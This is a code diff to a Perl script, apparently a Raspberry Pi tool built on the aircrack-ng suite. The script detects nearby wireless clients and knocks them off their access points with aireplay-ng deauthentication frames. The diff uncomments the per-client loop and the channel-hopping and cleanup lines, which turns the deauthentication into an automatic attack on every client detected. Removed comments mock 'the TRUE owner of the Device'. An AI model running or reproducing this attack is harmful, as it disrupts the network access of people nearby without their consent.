@@ -24,10 +24,11 @@ my $airodump	= "airodump-ng";
 # put device into monitor mode
 sudo($ifconfig, $interface, "down");
 
+# Uncomment if you want airmon to start mon mode or comment out if you have something else that triggers mon mode.
 #sudo($airmon, "start", $interface);
 
 # tmpfile for ap output
-my $tmpfile = "/mnt/ram/OUI-Prox";
+my $tmpfile = "/home/pi/somefile.txt"; # Change me before running
 
 
 while (1)
@@ -92,36 +93,35 @@ while (1)
 
 							print "CLIENT $1 $2\n";
 							$clients{$1} = $2;
+							# Add Alert command or action
 #							sleep 3;
 						}
 					}
 				}
 				close(APS);
 				sudo("rm", $tmpfile1);
-				#unlink($tmpfile1);
+				#unlink($tmpfile1); # old code
 		}
 		print "\n\n";
 #
-#		foreach my $cli (keys %clients)
+		foreach my $cli (keys %clients)
 #		{
-#			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
+			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
 #			
 			#Unmark to activate Deauth upon Detection.
 			#Hop onto the channel of the ap
 			print "Jumping onto Device's channel $chans{$clients{$cli}}[0]\n\n";
-#			sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
+			sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
 			sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);
 			sudo("iw", "phy", "phy1", "set", "channel", $chans{$clients{$cli}}[0]);
 
 			#sleep(1);
 
-			# now, disconnect the TRUE owner of the Device.
-			# sucker.
+			# Disconnect of clients to AP
 			#print "Disconnecting the true owner of the device ;)\n\n";
-			#sudo ("espeak", "Deauth in progress");
-			#Put sense-hat alert code here
+			# A Space to put action command code or alert
 			sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, "mon1");
-#			sudo("airmon-ng", "stop", "mon1");
+			sudo("airmon-ng", "stop", "mon1");
 
 
 		}
